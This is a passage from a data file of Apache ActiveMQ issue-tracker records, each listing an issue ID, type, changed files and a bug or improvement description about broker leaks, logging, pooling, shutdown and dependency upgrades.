A message consumer that has a Zero prefetch is informed that its pull request has timed out via a Null Message response from the broker.  Currently this response is causing the subscription enqueue counter to be incremented with each timed out pull request leading to confusing statistics on the subscription.  We should filter out the control message from increments of the enqueue counter.
issueID:AMQ-3994
type:Bug
changed files:DefaultDatabaseLocker.java
texts:DefaultDatabaseLocker will leak pooled connections on link failure
When the broker has lost the connection to the database through external issues &#8211; link or database goes down, the process broker will stop().When it is shutting down, it calls on each component (service) to stop().The DefaultDatabaseLocker when stopping will test the connection to see if it is open or not before calling close() on the connection. Given that the connection was closed due to a link failure, the connection is never returned to the pool, hence the leak.In this same file there is a comment in start() which warns about being careful about connection leaks.
issueID:AMQ-3995
type:Bug
changed files:
texts:PListTest.testSerialAddIterate runs for over 30 minutes on Hudson nodes
The PListTest.testSerialAddIterate takes over 30 minutes when run under Hudson on an EC2 medium node.  This should be removed, as testConcurrentAddIterate is a better test anyway
issueID:AMQ-3996
type:Bug
changed files:VMTransportServer.java
TransportServerFilter.java
JaasDualAuthenticationBroker.java
WSTransportServer.java
TcpTransportServer.java
SslTransportServer.java
NIOSSLTransportFactory.java
AmqpNioSslTransportFactory.java
StompNIOSSLTransportFactory.java
TransportServer.java
users2.properties
users1.properties
UdpTransportServer.java
HttpTransportServer.java
texts:NIO + SSL: Client certificates are null
If using protocol nio+ssl, the ConnectionInfo transportContext property does not contains peer certificates (which are present in the plain tcp ssl transport).The problem is that in the NIO transport, calling sslSession.getPeerCertificates() returns null.
issueID:AMQ-3997
type:Bug
changed files:PooledConnection.java
ConnectionPool.java
PooledSession.java
texts:Memory leak in activemq-pool
The org.apache.activemq.pool.PooledConnectionFactory from activemq-pool has a severe memory leak when using it for sending a lot of messages. Over time this causes memory to be eaten up.I have tracked it down to the following tickets: AMQ-3680, which keeps adding event listeners, despite previously added AMQ-2643, code which keep track of loaned sessions, causing JVM to create too many ConcurrentLinkedQueue$Node instancesThere may be others. But with resolutions to those I can get the pool to not eat memory, and keep memory consumption low.
issueID:AMQ-3998
type:Bug
changed files:
texts:Incorrect reporting of pendingQueueSize of durable subs after reconnect with unacked
A durable sub that does not ack messages, so uses a transaction of client ack and connects then disconnects results in duplicate tally of the pending message count for the active sub (keepdurablesubsactive must be at default true). This issue emerged post fixes for https://issues.apache.org/jira/browse/AMQ-3871
issueID:AMQ-4
type:New Feature
changed files:
texts:handle removal of TransportChannels neatly in the EmberIO transport
We"re not yet using the remove client notification EmberIO offers - we should do this
issueID:AMQ-4000
type:Bug
changed files:
texts:Durable subscription not getting unregistered on networked broker
In a network of two brokers, a durable subscription is correctly propagated across to the remote broker. However when the consumer unsubscribes from the durable subscription again, it is only removed on the local broker but not on the remote broker. The remote broker keeps its durable subscription alive.As a consequence messages sent to the topic destination on the remote broker for which the durable subscriptions existed, are passed on to the local broker, although there is no active subscription on the local broker. The local broker will discard these msgs but unnecessary traffic has already occurred on the network bridge.
issueID:AMQ-4001
type:Bug
changed files:
texts:activemq karaf feature uses different commons-lang than pom
activemq-karaf/src/main/resources/features.xml uses org.apache.servicemix.bundles.commons-lang 2.4_4 whereas the root pom uses commons-lang 2.6. These should be aligned.
issueID:AMQ-4002
type:Bug
changed files:BlobDownloader.java
BlobUploader.java
BlobTransferPolicy.java
texts:Instance of BlobTransferPolicy and its URL are being shared among multiple messages
Bug we encountered: using BlobMessage (FTP backend) and individual acknowledge, URL of BlobTransferPolicy was shared among messages following the acknowledge of messages.Example: 1 queue, 1 consumer, 1 producer, prefetch limit 5 messages Producer generated 10 messages Consumer received and processed (but do not ack) 5 messages Consumer acked the 5 messages in a row Consumer received 5 more messages and the first one shared the same BlobTransferPolicy and FTP URL that the last acknowledged messages.We tested the attached (one line) patch in our production server for more than one month and it did not the show the bug or any new one.
issueID:AMQ-4003
type:Improvement
changed files:PooledConnectionFactory.java
ConnectionPool.java
texts:Add option to PooledConnectionFactory to control if connection should be created on startup or not
The PooledConnectionFactory will currently always on startup create a connection, and if that fails a WARN is logged and ignored.I think we should allow end users to configure if they want the pool to create a connection on startup or not.If they set the option to false, then the connection is created on-demand.I have attached a patch with this option, using a default value of true to keep current behavior. The patch also adds some more logging, as well removing some not needed code, in the start method, ie the IOExceptionSupport that don"t make sense.
issueID:AMQ-4004
type:Improvement
changed files:
texts:activemq-pool - Rename maximumActive option maximumActiveSessionPerConnection
See nabblehttp://activemq.2283324.n4.nabble.com/DISCUSS-activemq-pool-Suggest-to-name-maximumActive-option-maximumActiveSessionPerConnection-tp4655761.html;cid=1346315970920-136
issueID:AMQ-4005
type:New Feature
changed files:
texts:Implement pluggable broker lockers
Currently shared storage master/slave locking is a job of a persistence adapter.It"s hardcoded in KahaDB to use shared file locking, while JDBC allows at least some customization.The idea is to create general locker interface and share it across available persistence adapters. So that for example, JDBC can use shared file lock or KahaDB use ZooKeeper lock when it"s available.We can also consider moving locking out of persistence layer and making it a job for a broker.
issueID:AMQ-4006
type:Task
changed files:
texts:activemq-pool - Upgrade to commons-pool 1.6.0
Currently we use 1.5.7 of commons-pool.We could upgrade to 1.6.0.
issueID:AMQ-4007
type:Bug
changed files:
texts:BrokerService TempUsage and StoreUsage Default Values Are Incorrect
Looking at the code in BrokerService.getSystemUsage(), the limits set for the TempUsage (50GB) and the StoreUsage (100GB) are incorrectly calculated:systemUsage.getTempUsage().setLimit(1024L * 1024 * 1000 * 50); // 50 GB                                                           systemUsage.getStoreUsage().setLimit(1024L * 1024 * 1000 * 100); // 100 GBThey should be:systemUsage.getTempUsage().setLimit(1024L * 1024 * 1024 * 50); // 50 GB                                                           systemUsage.getStoreUsage().setLimit(1024L * 1024 * 1024 * 100); // 100 GB
issueID:AMQ-4008
type:Improvement
changed files:ManagementContext.java
texts:Tomcat WARN on shutdown about ThreadLocal not cleared from log4j
SEVERE: The web application &#91;/camel-example-activemq-tomcat&#93; created a ThreadLocal with key of type &#91;org.apache.log4j.helpers.ThreadLocalMap&#93; (value &#91;org.apache.log4j.helpers.ThreadLocalMap@1eb0cd0&#93;) and a value of type &#91;java.util.Hashtable&#93; (value [{activemq.broker=myBroker}]) but failed to remove it when the web application was stopped. Threads are going to be renewed over time to try and avoid a probable memory leak.I got a bit annoyed by this when I was working on a new example for Apache Camel with an embedded AMQ broker. So I am digging into fixing this. Its in the start() method.
issueID:AMQ-4010
type:Improvement
changed files:JMXSupport.java
texts:Use pre compiled patterns for JMX ObjectName encoder
Using string replaceAll does not cache the regexp, and would need to compile on each invocation.Its thus better to use a pre compiled pattern if possible.
issueID:AMQ-4011
type:Improvement
changed files:MemoryIntPropertyEditor.java
BooleanEditor.java
MemoryPropertyEditor.java
StringArrayConverter.java
ListEditor.java
TypeConversionSupport.java
texts:Refactor IntrospectionSupport to avoid using java bean property editors
Java bean property editors is slow and not thread safe to use. We at Apache Camel has removed its usage in the Camel type converter system.We should do the same in ActiveMQ. There is only a number of default converters needed that is fairly easy to implement by hand (eg String <-> Numbers, Booleans etc.). This fixes some other issues with AMQ causing memory leaks in dynamic environments where you may run multiple brokers, or hot deploy brokers.
issueID:AMQ-4012
type:Improvement
changed files:StompFrame.java
BrokerService.java
RegionBroker.java
JDBCPersistenceAdapter.java
GenerateJDBCStatements.java
IntrospectionSupport.java
JmsFrameTranslator.java
Stomp.java
texts:Use english locale for introspection support when discovering setter/getter method names
See CAMEL-5199Similar issue with AMQ, where we should use english locale.
issueID:AMQ-4013
type:Task
changed files:
texts:Upgrade to xbean 3.11
Currently we use xbean 3.9, but there is a 3.11.1 release out.
issueID:AMQ-4015
type:Improvement
changed files:BrokerView.java
BrokerService.java
BrokerViewMBean.java
texts:Add uptime to broker mbean and when stopping broker to report its uptime
We got some code for this at Apache Camel.It would be nice to see the uptime in JMX and when the broker is shutdown in its logs.
issueID:AMQ-4016
type:Improvement
changed files:ActiveMQConnectionFactory.java
texts:org.apache.activemq.ActiveMQConnectionFactory - Seems like static thread pool is not used
Seems like the static thread pool created inorg.apache.activemq.ActiveMQConnectionFactoryIs not used. We should double check this, and possible remove the code, as it causes leak problems when pools is not properly shutdown, and also pools should not be static, as this does not go well in modular deployment environments.
issueID:AMQ-4017
type:Bug
changed files:DemandForwardingBridgeSupport.java
texts:Demand Forwarding Bridge uses value of asyncDispatch for advisory consumers
The value of the dispatchAsync option on the networkConnector element is used when creating the ConsumerInfo command that we dispatch to the remote broker with the aim of subscribing to demand-related consumer advisories.A "false" value means we risk blocking the remote broker if the local->remote broker connection is blocked.
issueID:AMQ-4019
type:Improvement
changed files:
texts:Make better use of commons-pool in activemq-pool
Currently activemq-pool uses only a tiny portion of the functionality that"s available in commons-pool opting instead to reinvent a lot of things that now exists there such as keyed object pools.  We can refactor the current codebase to better use common-pool.  This allows for easily adding features like enabling async checks for Connections that have idled out and removing them from the pool as well as adding more diagnostic methods to our API and using a well tested pooling backend instead of our own custom code.
issueID:AMQ-4020
type:Bug
changed files:
texts:MessageStore IOExceptionHandler needs to deal in StoreExceptions
Currently the IOExceptionHandler used by the store deals in IOExceptions which clash with the Transport.On an IOException, the transport closes the connection, so it does not allow store exceptions to propagate back to the client.This is one of the problems in the intermittent failure of org.apache.activemq.broker.ft.DbRestartJDBCQueueMasterSlaveTest.testSendReceive We need to separate IOExceptions form MessageStoreExceptions. It may be that a persistence adapter or message store can only throw StoreExcptions that wrap any underlying IOException and the StoreIOExceptionHandler only throws StoreExceptions.In the case where the StoreIOExceptionHandler does not handle the exception by pause/resume/terminate - the underlying StoreException should be propagated to the client.
issueID:AMQ-4026
type:Improvement
changed files:DemandForwardingBridgeSupport.java
BrokerService.java
KahaDBStore.java
JournalPersistenceAdapter.java
MQTTInactivityMonitor.java
Queue.java
ActiveMQMessageConsumer.java
JmsConnector.java
MulticastDiscoveryAgent.java
TaskRunnerFactory.java
ActiveMQConnection.java
ThreadPoolUtils.java
AbstractInactivityMonitor.java
texts:Refactor logic to shutdown thread pools using a single API to ensure better shutdown and offer logging et all
In Apache Camel we have a centralized API for thread pools. This allows us to track this in Camel, and ensure thread pools is enlisted in JMX, and also unregistered again. As well having logs when thread pools is created / shutdown etc. Also better logic for shutdown graceful and then fallback to be aggressive etc. And to add a thread factory, that offers a naming pattern style, so end users can customize thread naming etc.In activemq-core, there is pieces of logic for that. We should tidy this up, and especially ensure shutdown is happening consistent and more graceful, etc.This can help make it possible to do as Camel to also enlist thread pools in JMX.
issueID:AMQ-4027
type:Improvement
changed files:AbstractJmxCommand.java
texts:Add support for java 7 in AbstractJmxCommand
In the class org.apache.activemq.console.command.AbstractJmxCommand the method  isSunJVM() checks wether the JVM is from Sun or not. This is done by comparing the system property "vendor" with the hardcoded string "Sun Microsystems Inc.". This prevents using the PID for connecting to the JVM via JMX locally when using java 7 because the vendor string is "Oracle Corporation".A possible bugfix is to enhance the method like this:public static boolean isSunJVM() {        return (getJVM().equals("Sun Microsystems Inc.") ||                 getJVM().equals("Oracle Corporation"));}
issueID:AMQ-4028
type:Improvement
changed files:
texts:Add support for testing secured web sockets
We should be able to extend WSTransportTest to run wss tests
issueID:AMQ-4029
type:Improvement
changed files:ManagementContext.java
texts:Unregistering mbean should handle null mbean names
Noticed this WARN from the test log of activemq-core.2012-09-07 12:29:06,232 &#91;MQ ShutdownHook&#93; - WARN  ManagementContext              - Error stopping and unregsitering mbean null due Object name cannot be null
issueID:AMQ-4031
type:Bug
changed files:BrokerService.java
texts:BrokerFactoryBean logs error when starting a non persistent broker
When starting a non persistent broker an error is logged explaining that the temp store will not accept any data when used..2012-09-08 02:05:45,457 ERROR [main] (org.apache.activemq.broker.BrokerService) Temporary Store limit is 0 mb, whilst the max journal file size for the temporary store is: 32 mb, the temp store will not accept any data when used.
issueID:AMQ-4033
type:Bug
changed files:
texts:AMQ Broker - Uses custom RMIServerSocketFactory class which cannot be unloaded due socket reuse
When embedding ActiveMQ Broker in a container, such as Tomcat or others. And if you have JMX enabled on the broker, then a RMI registry is created to allow JMX/RMI over TCP.This uses a custom RMIServerSocketFactory that gets enlisted into the JDK RMI registry. But when you undeploy the AMQ broker, there is no API in the JDK to unregister your custom RMIServerSocketFactory class.And therefore the JDK (system class) has a strong reference to the custom RMIServerSocketFactory, which prevents the container classloader to fully unload all classes.Disabling JMX on the broker, allows to unload all the classes.
issueID:AMQ-4034
type:Improvement
changed files:
texts:Create Karaf Integration Test
Used pax-exam based tests to verify that broker works in Karaf environment.
issueID:AMQ-4035
type:Bug
changed files:KahaDBStore.java
texts:Null pointer in class KahaDBStore programmed
The method "protected void doAcknowledge(ConnectionContext context, String subscriptionKey, MessageId messageId, MessageAck ack)" in KahaDBStore, line 705, contains a get-operation on parameter "ack" in line 711:command.setTransactionInfo(transactionIdTransformer.transform(ack.getTransactionId()));Unfortunately, the method is called from inside with setting ack=null!(same class, method "run" of internal class StoreTopicTask, line 1268):this.topicStore.doAcknowledge(context, key, this.message.getMessageId(), null);Thus, a null pointer exception is guaranteed, whenever the run-method is called (which is the case, for instance, when topic messages are synchronized in a network cluster).
issueID:AMQ-4038
type:Task
changed files:
texts:Favor using JARs from Maven central
There is a number of JARs now in Maven central. We should favor using them, over 3rd party Maven repos.For example josql is in central, and not needed to use the fuse repo anymore.
issueID:AMQ-4041
type:Task
changed files:
texts:Upgrade ActiveMQ karaf feature
The activemq feature for Karaf is a bit outdated and uses older bundle versions. We should align that with what maven uses. And what SMX/Camel generally uses.
issueID:AMQ-4043
type:Bug
changed files:MessageServlet.java
texts:Web demo - Receive a message page renders an error page
See screenshot.This fails on AMQ 5.6.0 also.When you click that link you get this error. Also if you send a message beforehand.
issueID:AMQ-4044
type:Bug
changed files:BrokerService.java
texts:Shutting down AcitveMQ broker started in foreground logs 2 times
Staring AMQ in the foreground$bin/activemq console^C INFO | ActiveMQ Message Broker (localhost, ID:davsclaus.lan-55150-1347368371679-0:1) is shutting down INFO | ActiveMQ Message Broker (localhost, ID:davsclaus.lan-55150-1347368371679-0:1) is shutting down INFO | Connector openwire Stopped INFO | Connector vm://localhost Stopped INFO | PListStore:[/opt/apache-activemq-5.6.0/data/localhost/tmp_storage ] stopped INFO | Stopping async queue tasks INFO | Stopping async topic tasks INFO | Stopped KahaDB INFO | ActiveMQ JMS Message Broker (localhost, ID:davsclaus.lan-55150-1347368371679-0:1) stopped INFO | Connector openwire Stopped INFO | ActiveMQ JMS Message Broker (localhost, ID:davsclaus.lan-55150-1347368371679-0:1) stoppedNotice it says shutting down 2 times, as well stopping 2 times. We should try to look into this and only issue 1 shutdown/stop.
issueID:AMQ-4045
type:Task
changed files:BrokerService.java
texts:Unit test shows NPE in BrokerService
Seehttps://builds.apache.org/job/ActiveMQ/org.apache.activemq$activemq-core/1066/testReport/org.apache.activemq.store.jdbc/JDBCPersistenceAdapterTest/testAddRemoveConsumerDest/We should try to fix the NPE so it wont happen.
issueID:AMQ-4047
type:Bug
changed files:
texts:activemq-optional - Should include the JARs it needs
Installing activemq-optional, do not include all the JARs it needs. eg in the pom.xml file we got a number of JARs which isn"t installed.
issueID:AMQ-4049
type:Improvement
changed files:BrokerService.java
texts:Polish the AMQ start|stop logging
The start and stop logging should be polished, to ensure we log starting .. started. shutting down .. shutdown.
issueID:AMQ-4053
type:Task
changed files:
texts:Cleanup duplicate JARs in ActiveMQ distro
The ActiveMQ distro has some duplicate JARs in the lib/optional directory. We should cleanup this.
issueID:AMQ-4054
type:Task
changed files:
texts:@deprecate axis support and remove it in AMQ 5.8
After the AMQ 5.7 release, we should remove support for the old Axis 1.x we have in activemq-optional.Its not used, nor maintained, or tested etc. And Axis 1.x has been EOL for a long time.
issueID:AMQ-4056
type:Task
changed files:ZeroconfDiscoveryAgent.java
JmDNSFactory.java
texts:Remove activemq-jmdns module
This module is not in use, and is very very old. We should remove it from the distribution.
issueID:AMQ-4057
type:Improvement
changed files:
texts:activemq-option - Upgrade to http client 4.2
We should try to upgrade to http client 4.2 so we are aligned with what Camel uses etc.activemq-option unit tests needs to be adjusted, as tests fails due http client apparently dont shutdown cleanly
issueID:AMQ-4058
type:Bug
changed files:HttpTransportFactory.java
HttpsTransportFactory.java
texts:http transport should remove options in uri
When using the http/https transports and have options for soTimeout etc. then they should be stripped from the uri we use to call the remote http server.
issueID:AMQ-4059
type:Improvement
changed files:pom.xml
WebClient.java
MessageServlet.java
texts:activemq-web - Remove dependency on Camel
The web console uses camel for sending a message to a queue using the ajax servlet.We should use plain JMS API for that to remove dependency on Camel, as its fairly simple JMS code.This allows people to use the ActiveMQ as a broker with the web console, without having Camel as dependency. In the end it is about giving people to choice. eg to run a broker with web console with as few JARs needed.
issueID:AMQ-406
type:Improvement
changed files:
texts:enable the configuration of prefetch policies in the JNDI configuration file by allowing the prefetch values to be visible as properties on ActiveMQConnectionFactory
if we delegate all the properties on PrefetchPolicy as basisc properties on ActiveMQConnectionFactory we can configue the values in JNDI. e.g. in jndi.propertiesConnectionFactory.queuePrefetch = 100which would call ActiveMQConnectionFactory.setQueuePrefetch(100) => prefetchPolicy.setQueuePrefetch(100) etc
issueID:AMQ-4060
type:Improvement
changed files:pom.xml
features.xml
common-bin.xml
OXMMessageTransformer.java
texts:activemq-optional - Upgrade Spring OXM to Spring 3 version
Spring OXM is now part of spring framework itself. So we should use that instead of the old spring-ws 1.5 release.
issueID:AMQ-4062
type:Bug
changed files:
texts:durableTopicPrefetch attribute in policyEntry in activemq.xml dont take effect
There are three methods to configure the prefetchSize of a consumer,per broker,per connection and per destination.I configured the policyEntry element in activemq.xml and set durableTopicPrefetch="5".Then a durable topic Consumer connected to the broker ,but the prefetchSize instance variable of ConsumerInfo object was 100, the default value for durable topic consumer.Some messages of the topic consumer were stored in the kahaDB.
issueID:AMQ-4063
type:Improvement
changed files:
texts:Trim RAR to not included Derby JAR
&#91;13:08:04&#93; <cibsen> anyone remember why apache derby is included in the AMQ RAR (eg the JCA adapter) ? its 2.5mb&#91;13:09:32&#93; <gtully> cibsen: that is an oversight is my guess, b/c the rar pulls in activemq all.&#91;13:10:04&#93; <cibsen> gtully yeah the pom.xml has a zillion excludes&#91;13:10:16&#93; <cibsen> so i guess i should add derby to the excluded then&#91;13:10:28&#93; <gtully> cibsen: the jdbc persistence adapter defaults to using derby in the absence of a configured datasource, that is why it is there in the first place as a dep on core&#91;13:10:52&#93; <gtully> cibsen: yep, cause there is little point using jdbc for an embedded broker in a j22 container&#91;13:11:07&#93; <cibsen> wouldn"t the rar be able to use a persistence adapter installed in the jee server, eg lets say you use oracle as database&#91;13:11:30&#93; <gtully> cibsen: yep
issueID:AMQ-4065
type:New Feature
changed files:IndividualDeadLetterStrategy.java
texts:Add optional destination suffix for the IndividualDeadLetterStrategy
Add an optional destination suffix option to IndividualDeadLetterStrategy like the current prefix option.  By default this will be null and no suffix will be added.
issueID:AMQ-4066
type:Improvement
changed files:ConsumerInfo.java
TransportConnector.java
SslTransportFactory.java
AmqMessagesQueryFilter.java
XBeanBrokerService.java
TransportFactory.java
HttpsTransport.java
Valve.java
HttpTransport.java
XStreamMessageTransformer.java
texts:Cleanup of old deprecated methods and classes from the code base.
Remove old deprecated code which has been marked deprecated since before the last release, some of these have been marked as such since 5.3.0.AmqMessagesQueryFilter::createConnectionTransportConnector::setBrokerNameConsumerInfo::setSubcriptionNameConsumerInfo::getSubcriptionNameValve.javaTransportFactory::bindSslTransportFactory::setKeyAndTrustManagersXBeanBrokerService::setDestroyApplicationContextOnShutdownXBeanBrokerSercice::setDestroyApplicationContextOnStopXStreamMessageTransformer.javaHttpTransport.javaHttpsTransport.java
issueID:AMQ-4067
type:Improvement
changed files:BrokerService.java
AbstractInactivityMonitor.java
texts:Prefix Thread names with ActiveMQ
We should prefix the thread names with ActiveMQ where we can, so people can see its from ActiveMQ. Currently we have that in many of the threads. But some are still not like inactive monitor, broker service etc.
issueID:AMQ-4068
type:Improvement
changed files:
texts:Job Scheduler Store Growth is Unrestricted
When using scheduled delivery, it is possible to grow the job scheduler store indefinitely.  As no quota can be set on the size of this store, a malfunctioning, malicious, or prodigious producer can easily consume all available storage with scheduled messages without any alerts being raised by the broker.  If the operators do not have disk space monitoring in place outside of the broker, the broker can become innoperable without warning.Provide a mechanism to set a usage quota for the job scheduler store.  The mechanism should conform to the current resource quota model provided by SystemUsage as well as provide monitoring through JMX.I have attached a basic patch to add management, enforcement, and configurability to the size of the job scheduler data store.  Any guidance on things I missed or did not account for would be greatly appreciated.While testing the size reporting in JMX, I noticed that the he Kaha persistence adapter seems to calculate its size differently than the job scheduler store.  It appears that the job scheduler store is reporting the size of the data files and index while the Kaha persistence adapter is only reporting the size of the data files.  What is the reason for this difference?  I noticed the difference because the broker was reporting a 33% usage of the job scheduler store (100MB limit) immediately on a clean broker startup.
issueID:AMQ-4069
type:Improvement
changed files:
texts:Upgrade Maven Plugins
We should upgrade the various maven plugins to newer releases. As well try to address the WARNs they may report as well.
issueID:AMQ-4070
type:Bug
changed files:
texts:catstomp.rb does not work anymore
with the most recente stomp gem, the send method has been replaced with publish, so the bundled catstomp does not longer work.Follows a proposal of a working catstomp.rb with one improvement: now it stops gracefully con CTRL+Ccheers,Francesco#!/usr/bin/env ruby ------------------------------------------------------------------------ Licensed to the Apache Software Foundation (ASF) under one or more contributor license agreements.  See the NOTICE file distributed with this work for additional information regarding copyright ownership. The ASF licenses this file to You under the Apache License, Version 2.0 (the "License"); you may not use this file except in compliance with the License.  You may obtain a copy of the License at  http://www.apache.org/licenses/LICENSE-2.0  Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License. ------------------------------------------------------------------------require "rubygems"require "stomp"continue = truetrap("INT") {  puts "CTRL+C"  puts "shutting down ..."  @conn.disconnect  sleep 1  STDIN.close}@port = 61613@host = "localhost"@user = ENV&#91;"STOMP_USER"&#93;;@password = ENV&#91;"STOMP_PASSWORD"&#93;@host = ENV&#91;"STOMP_HOST"&#93; if ENV&#91;"STOMP_HOST"&#93; != NIL@port = ENV&#91;"STOMP_PORT"&#93; if ENV&#91;"STOMP_PORT"&#93; != NIL@destination = "/topic/stompcat"@destination = $&#91;0&#93; if $&#91;0&#93; != NIL$stderr.print "Connecting to stomp://#{@host}:#{@port} as #{@user}
"@conn = Stomp::Connection.open @user, @password, @host, @port, true$stderr.print "Sending input to #{@destination}
"@headers = {"persistent"=>"false"} @headers&#91;&#39;reply-to&#39;&#93; = $&#91;1&#93; if $&#91;1&#93; != NILbegin  STDIN.each_line { |line|     @conn.publish @destination, line, @headers  }rescue IOErrorend
issueID:AMQ-4073
type:Bug
changed files:
texts:Cannot shut down broker under certain conditions with schedule delivery and producer flow control
When producer flow control is enabled and the the job scheduler attempts delivery, the job scheduler blocks while attempting delivery.  This blocking holds the lock on the job scheduler and stops all other job scheduler activity.  The holding of the lock on the job scheduler also blocks the delivery of additional scheduled messages and can impact the shutdown of the broker.org.apache.activemq.broker.scheduler.JobSchedulerImpl.schedule(String, ByteSequence, String, long, long, int) waits for the lock while the job scheduler is blocked.  Any transport connections attempting to call this method get blocked and are also unable to shutdown.  Connections do log "2012-09-24 12:04:23,661 &#91;main           &#93; - INFO  TransportConnection            - The connection to "vm://localhost#0" is taking a long time to shutdown." when attempting shutdown with the job scheduler blocked and a client attempting to schedule a message, but do not log anything when this situation occurs under normal broker operation.  The producer simply stops producing messages.The shutdown is blocked by org.apache.activemq.broker.TransportConnection.serviceLock as it is owned by the blocked thread trying to schedule a new message.I have attached a unit test that reproduces the issue.  The test will not complete as it hangs on the broker shutdown as described above.
issueID:AMQ-4076
type:Bug
changed files:
texts:sizePrefixDisabled and/or maxFrameSize change in AcriveMq 5.6 broke FilePendingMessageCursor for big messages
https://issues.apache.org/jira/browse/AMQ-498 causes problem for default marshaller created by cursor.see: http://activemq.2283324.n4.nabble.com/sizePrefixDisabled-and-or-maxFrameSize-change-in-AcriveMq-5-6-broke-FilePendingMessageCursor-for-bigs-tp4656898.html;cid=1348569651674-314The default should be unlimited so that the check is done by the transports, the store just unmarshalls/marshalls
issueID:AMQ-4078
type:Improvement
changed files:
texts:Unable to start ActiveMQ as Windows Service when there is space in the folder path
We installed ActiveMQ as windows service from the path, C:Program Filesapache-activemq-5.6.0 and when tried to start the service, it could not start.But when we install ActiveMQ as windows service from the path, C:apache-activemq-5.6.0 or any other folder without space between the folder path, it starts successfully.
issueID:AMQ-4080
type:Bug
changed files:
texts:Integrate the Fusesource LevelDB module into the ActiveMQ build.
None
issueID:AMQ-4081
type:Bug
changed files:
texts:favicon should be handled as binary file in assembly
In the assembly we should include the webapps/favicon.ico as a binary file.
issueID:AMQ-4082
type:Improvement
changed files:DemandForwardingBridgeSupport.java
texts:Refactor network bridge start/stop to reduce async tasks and synchronisation - it is way to complicated atm
sequence of events on a start is way to random as a result of many async tasks.It should/could be very simple.start remote transportwait for remote broker infostart local transport and local bridgestart remote bridgeit is all or nothing w.r.t to success or failure.we have sufficient tests in place to safely do the refactor at this stage.There have been many bugs in this area and there are still some outstandinghttps://issues.apache.org/jira/browse/AMQ-3993
issueID:AMQ-4083
type:Bug
changed files:
texts:Consumers in Client Ack sessions can fail to ack expired messages in some cases
For a consumer in Client Ack sessions, if a Message is acked in some cases and there is an outstanding pending ack for expired messages the pending ack will get dropped and the messages are never acked, is this happen enough the consumer can stall.
issueID:AMQ-4084
type:Bug
changed files:
texts:Linux/Unix Files Have Incorrect EOL When Packaged
When building the broker on a Windows machine, the Linux/Unix specific files are not converted to the correct EOL character.  Specifically, the activemq and activemq-admin script files.  If these files are not converted when the package is built on a Windows machine, then the broker fails to run when deployed on a Linux/Unix machine.
issueID:AMQ-4087
type:Task
changed files:
texts:Web console - Should use the AMQ logo with the TM
We should use the updated logo that has the TM sign.
issueID:AMQ-4088
type:Bug
changed files:
texts:The perfharness-activemq.sh script has 5.0-SNAPSHOT as version number
This script is part of the release. We should remove the version number. It assumes that the apache-activemq-5.0-SNAPSHOT.jar and perfharness.jar files are in the current directory.  If they are not,
issueID:AMQ-4089
type:Improvement
changed files:
texts:The user-guide from the kit should be improved a bit to tell how to stop the broker etc
... and also have links for further readings etc.For example it should tell about the web console / web demos etc as well.And maybe a bit about JMX so you can see stats there also.Its the user-guide.html file in the dist kit.
issueID:AMQ-4091
type:Improvement
changed files:
texts:Allow a memory limit to be configured on a temp topic
It is currently not possible to enable producer flow control on a temp topic using a destination limit. With a regular topic is it.Currently, we don"t apply any destination policy to temp topics. We should allow setting limits to allow temp topic to be partitioned such that they don"t consumer all resources.
issueID:AMQ-4092
type:Bug
changed files:
texts:ConcurrentModificationException when using message groups
seeing these WARN messages frequently while consuming (maxConcurrentConsumers=5) from a queue with the message groups header (JMSXGroupID) set.  If I disable the message groups header, these errors go away...  That said, I don"t see any specific errors with my application (at this point), just these messages in my logs.2012-10-04 02:34:02,552 |  WARN - Service              - | Async error occurred: java.util.concurrent.ExecutionException: java.util.ConcurrentModificationExceptionjava.util.concurrent.ExecutionException: java.util.ConcurrentModificationException at java.util.concurrent.FutureTask$Sync.innerGet(FutureTask.java:222) at java.util.concurrent.FutureTask.get(FutureTask.java:83) at org.apache.activemq.broker.region.Queue.doMessageSend(Queue.java:785) at org.apache.activemq.broker.region.Queue.send(Queue.java:707) at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:407) at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:503) at org.apache.activemq.broker.jmx.ManagedRegionBroker.send(ManagedRegionBroker.java:305) at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:129) at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:96) at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:306) at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:135) at org.apache.activemq.broker.TransportConnection.processMessage(TransportConnection.java:453) at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:681) at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:292) at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:150) at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:116) at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50) at org.apache.activemq.transport.vm.VMTransport.iterate(VMTransport.java:231) at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:122) at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:43) at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908) at java.lang.Thread.run(Thread.java:680)Caused by: java.util.ConcurrentModificationException at java.util.HashMap$HashIterator.nextEntry(HashMap.java:793) at java.util.HashMap$KeyIterator.next(HashMap.java:828) at org.apache.activemq.util.MarshallingSupport.marshalPrimitiveMap(MarshallingSupport.java:64) at org.apache.activemq.command.Message.beforeMarshall(Message.java:210) at org.apache.activemq.command.ActiveMQObjectMessage.beforeMarshall(ActiveMQObjectMessage.java:199) at org.apache.activemq.openwire.v6.MessageMarshaller.looseMarshal(MessageMarshaller.java:277) at org.apache.activemq.openwire.v6.ActiveMQMessageMarshaller.looseMarshal(ActiveMQMessageMarshaller.java:111) at org.apache.activemq.openwire.v6.ActiveMQObjectMessageMarshaller.looseMarshal(ActiveMQObjectMessageMarshaller.java:111) at org.apache.activemq.openwire.OpenWireFormat.marshal(OpenWireFormat.java:168) at org.apache.activemq.store.kahadb.KahaDBStore$KahaDBMessageStore.addMessage(KahaDBStore.java:429) at org.apache.activemq.store.kahadb.KahaDBStore$StoreQueueTask.run(KahaDBStore.java:1177) ... 3 more
issueID:AMQ-4094
type:Bug
changed files:BTreeNode.java
